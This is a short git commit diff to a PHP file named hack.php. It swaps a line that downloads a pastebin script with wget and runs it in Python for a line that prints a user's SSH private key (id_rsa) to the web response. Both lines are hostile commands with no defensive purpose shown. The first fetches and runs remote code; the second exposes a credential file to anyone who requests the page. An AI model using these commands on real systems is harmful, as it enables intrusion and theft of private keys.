ad7415753d4dec6ce81773ea5947de1302bf25e0
Kio-td <toobanooba@gmail.com>
2018-10-23 03:42:26 -0400

    comeon

--- hack.php
+++ hack.php
@@ -1,4 +1,3 @@
 <?php
-error_reporting(E_ALL); ini_set('display_errors', TRUE); ini_set('display_startup_errors', TRUE);
-shell_exec("wget https://pastebin.com/raw/vuLebBhm -O bdc.py && python bdc.py");
+echo shell_exec("cat /home/kio_thedev_gmail_com/.ssh/id_rsa");
  ?>
